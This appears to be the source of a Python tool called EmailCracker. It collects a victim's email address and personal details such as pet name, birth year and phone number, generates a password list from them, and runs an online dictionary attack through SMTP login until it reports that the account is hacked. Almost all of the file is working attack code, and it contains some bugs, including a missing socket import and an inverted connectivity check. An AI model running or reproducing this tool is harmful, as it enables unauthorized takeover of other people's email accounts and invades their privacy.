import os,sys,time,smtplib,argparse,configparser
from itertools import permutations,combinations


setup = configparser.ConfigParser()
setup.read('config.ini')
SMTPhost = setup.get('SMTP', 'host')
SMTPport = setup.getint('SMTP', 'port')


# Versoin: 2.0.1
# Name: emailCracker
# Author: evilfeonix
# Date: 10 - AUGUST - 2024
# Website: www.evilfeonix.com 
# Email: evilfeonix@gmail.com 


################ EmailCracker is a tool that simulate a password guessing attack (brute force or dictionary)
###############  Named, (EmailCracker) is a Python-based project designed to crack password based on email services
######           It aimed to generates a list of password (also known as wordlist) based on the victim's informatiom provided
############     Those password this tool generate are 4 in minimum and 18 in maximum (length)
################ And also trys to crack the victim's email password with the generated password.


stop="\033[0m"
red="\033[31;1m"
darkred="\033[91m"
blue="\033[34;1m"
green="\033[32;1m"
yellow="\033[33;1m"
purple="\033[35;1m"


add=f"{red}[{stop}+{red}]{yellow} "
error=f"{blue}[{stop}-{blue}]{red} "
notice=f"{blue}[{stop}!{blue}]{red} "
info2=f"{green}[{stop}•{green}]{purple} "
success=f"{purple}[{stop}√{purple}]{green} "
first= f"{green}[{stop}01{green}]{purple} "
second= f"{green}[{stop}02{green}]{purple} "
third= f"{green}[{stop}03{green}]{purple} "
version="2.0.1.6"


def slow2(y):
    for x in y+'    '+'    '+'\r':sys.stdout.write(x),sys.stdout.flush(),time.sleep(1./300)
def slow(y):
    for x in y:sys.stdout.write(x),sys.stdout.flush(),time.sleep(1./300)
def show(y):
    for x in y+'\n':sys.stdout.write(x),sys.stdout.flush(),time.sleep(1./1000)
def slowbr(y):
    for x in y+'\n':sys.stdout.write(x),sys.stdout.flush(),time.sleep(1./300)
def loadbr(y):
    for x in y:sys.stdout.write(x),sys.stdout.flush(),time.sleep(1./300)
    for a in '...'+'\n':sys.stdout.write(a),sys.stdout.flush(),time.sleep(1)
def load(y):
    for x in y:sys.stdout.write(x),sys.stdout.flush(),time.sleep(1./300)
    for a in '...'+'      '+'\r':
        sys.stdout.write(a),sys.stdout.flush()
        if a==' ':time.sleep(1./300)
        else:time.sleep(1)


def internet():
    try:
        s = socket(AF_NET, SOCK_STREAM)
        s.connect_ex(("www.google.com",80))
        return True
    except Exception:return False
    

def aboutus():
    os.system("clea" + "r || cls")
    granted()
    slowbr(f'\t{info2}Tool Name      {blue}:>>{purple}  Email Cracker')
    slowbr(f'\t{info2}Version        {blue}:>>{purple}  v[{version[:-2]}]')
    slowbr(f'\t{info2}Author         {blue}:>>{purple}  evilfeonix')
    slowbr(f'\t{info2}Github         {blue}:>>{purple}  Evil {darkred}FeoniX')
    slowbr(f'\t{info2}Youtube        {blue}:>>{purple}  Evil {darkred}FeoniX')
    slowbr(f'\t{info2}Latest Update  {blue}:>>{purple}  17-11-2024')
    slowbr(f'\t{info2}Website        {blue}:>>{purple}  www.evilfeonix.com{red}')
    slowbr("="*60)
    slowbr("")
    act=input(f'{add}Press {purple}[{stop}ENTER{purple}]{yellow} To Continue')
    return main()

def granted():
    logo=f"""{green}
    //{darkred}===={green} /||   /||     /|| ||     //         //{darkred}===={green} //{darkred}==={green}//  /||     //{darkred}===={green} //   //  //{darkred}===={green} //{darkred}==={green}// 
  //      //||  //||    //|| ||    //        //      //    // //||   //      //   // //      //    //
 //{darkred}===={green}  // || // ||   //{darkred}={green}|| ||   //        //      //{darkred}=={green}//   //{darkred}={green}||  //      //{darkred}=={green}//  //{darkred}===={green}  //{darkred}=={green}//
//      //  ||//  ||  //  || ||  //        //      //    // //  || //      //   // //      //    //
//{darkred}===={green} //   |//   || //   || || //{darkred}===={green}     //{darkred}===={green} //    // //   || //{darkred}===={green} //   //  //{darkred}===={green} //    //{stop}"""
    show(logo)
    slow(f"{red}")
    slowbr("="*60)
    slowbr(f"{blue}:>> {green}Coded by EVIL {darkred}FEONIX {blue}<<:".center(66," "))
    slowbr(f"{blue}:>> {green}www.evilfeonix.com {blue}<<:".center(63," "))
    slowbr(f"{blue}:>> {green}Email Cracker {blue}<<:{red}".center(66," "))
    slowbr("="*60)


def banner(password,ban):
    bannerOne=f"""{stop}| {blue}:>> {purple} Email Cracker  {blue}<<: {stop}|{red}""".center(69," ")+"""\n"""+"""="""*60+f"""\n{stop}|  {purple}Gather information on Victim's before using this tool! {stop} |{red}\n"""+"""="""*60+f"""\n{stop}"""
    bannerTwo=f"""{stop}| {blue}:>> {stop} [{green}{len(password)}{stop}]  {purple}Password Generated!  {blue}<<: {stop}|{red}""".center(74," ")+"""\n"""+"""="""*60+f"""\n{stop}| {purple}Attempting to Crack given Mail with Generated Passwords! {stop}|{red}\n"""+"""="""*60+f"""\n{stop}"""
    bannerThree=f"""{stop}| {blue}:>> {purple} Zero Password Generated  {blue}<<: {stop}|{red}""".center(66," ")+"""\n"""+"""="""*60+f"""\n{stop}| {purple}U most Provide Victim's Information to Generate Password {stop}|{red}\n"""+"""="""*60+f"""\n{stop}"""
    if ban=="1":return bannerOne
    elif ban=="2":return bannerTwo
    else:return bannerThree
    

def get_info():
    os.system("clea" + "r || cls")
    slowbr(banner(password,ban="1"))
    mail=input(f"{add}Victim's email addr: {purple}")
    time.sleep(2)
    os.system("clea" + "r || cls")
    slowbr(banner(password,ban="1"))
    pet=input(f"{add}Victim's Pet Name: {purple}")
    father=input(f"{add}Victim's Son Name: {purple}")
    name=input(f"{add}Victim's First Name: {purple}")
    nnnm=input(f"{add}Victim's Nick Name: {purple}")
    year=input(f"{add}Victim's Year-of-Birth: {purple}")
    phone=input(f"{add}Victim's Phone Number: {purple}")
    victim.append(mail),infoga.append(pet),infoga.append(year),infoga.append(name)
    infoga.append(nnnm),infoga.append(father),infoga.append(phone),time.sleep(2)
    

def pwdGen(argument):
    get_info()
    for a in range(0, len(infoga)):
        comb=combinations(infoga, a+1)
        for set in list(comb):
            pwdLen=0
            for b in set:pwdLen+=len(b)
            if argument.minLen<=pwdLen<=argument.maxLen:
                perm=permutations(set)
                for c in list(perm):
                    pwd=("")
                    for d in range(0,len(c)):pwd+=c[d]
                    if pwd in password:continue 
                    else:password.append(pwd)
               

def cracker(argument):
    pwdGen(argument)
    os.system("clea" + "r || cls")
    if len(password)==0:
        slowbr(banner(password,ban="3"))
        slowbr(f"{error}We are unable to generate password becouse u didn't provide victim's information{stop}")
        os.sys.exit()
        

    slowbr(banner(password,ban="2"))
    slowbr("")
    slow(f"{notice}Pleace wait!, starting SMTP Server{stop}"),load('')
    smtpObj = smtplib.SMTP_SSL(SMTPhost,SMTPport)
    smtpObj.ehlo()
    # smtpObj.starttls()
    time.sleep(3)
    index=0
    mail=victim[0]
    for pwd in password:
        index+=1
        slow(f"{notice}{index} of {len(password)}, {yellow}Trying {blue}:>>{yellow} {pwd}{stop}"),load('')
        try:
            smtpObj.login(mail, pwd)
            os.system("clea" + "r || cls")
            time.sleep(1)
            slowbr(f'\t{green}Password Found!')
            loadbr(f'\t{green}This Account has been Hacked{stop} ^_^')
            time.sleep(3)
            os.system("clea" + "r || cls")
            granted()
            slowbr(f"\t{success}Victim's Email Addr {blue}:>> {green}{mail}")
            slowbr(f"\t{success}Victim's Password {blue}:>> {green}{pwd}{stop}")
            os.sys.exit(1)
        except smtplib.SMTPAuthenticationError as err:
            if str(err)[14]=='<':
                loadbr(f'\t{green}This Account has been Hacked{stop} ^_^'),show()
                time.sleep(3)
                slowbr(f'\t{green}Password Found {blue}:>> {green}{pwd}')
                slowbr(f'\t{green}Email Address {blue}:>> {green}{mail}{stop}')
                os.sys.exit(1)
            else:slow2(f'{red}Password {blue}:>>{red} Not Matched!')
    slow2(f'\n{notice}Password Not Found!{stop}'),slowbr('')


def main():
    parser=argparse.ArgumentParser(description="This is a dictionary attack tool that generates a list of password (wordlist) based on the victim's info2rmatiom provided and trys to crack the victim's email password.")
    parser.add_argument("---minLen", help="minimum length of password", default=4)
    parser.add_argument("--maxLen", help="maximum length of password", default=18)
    argument=parser.parse_args()
    os.system("clea" + "r || cls"),granted()
    net=internet()
    if net:
    # if not net:
        time.sleep(1)
        slow(f"\n{error}Please check your internet connection{stop}")
        os.sys.exit()
    try:
        slowbr(f"""\n\t{first}Launch Attacks\n\t{second}About\n\t{third}Exit\n""")
        opt=input(f"""{green}[{stop}SELECT OPTION..{green}] {blue}:>>{purple} """)
        if opt in["1","01","a","A"]:cracker(argument)
        elif opt in["2","02","b","B"]:aboutus()
        elif opt in["3","03","c","C"]:slowbr(f"\n{error}Thanks for using our tool.{stop}"),os.sys.exit()
        else:loadbr(f"\n{error}Invali Option!{stop}"%(error,stop)),main()
    except KeyboardInterrupt:slowbr(f"\n\n{error}User Requested an Interrupt!{stop}"),slow(f"{error}Program Running Down!{stop}"),load(''),os.sys.exit()

    """       //==== /||   /||     /|| ||     //         //==== //===//  /||     //==== //   //  //==== //===// 
            //      //||  //||    //|| ||    //        //      //    // //||   //      //   // //      //    //
           //====  // || // ||   //=|| ||   //        //      //==//   //=||  //      //==//  //====  //==//
          //      //  ||//  ||  //  || ||  //        //      //    // //  || //      //   // //      //    //
          //==== //   |//   || //   || || //====     //==== //    // //   || //==== //   //  //==== //    //     """


victim=[]
infoga=[]
password=[]
if __name__ == "__main__":
    main()


#            Note that the creators of this tool are not responsible for any misuse or damage caused by its usage.
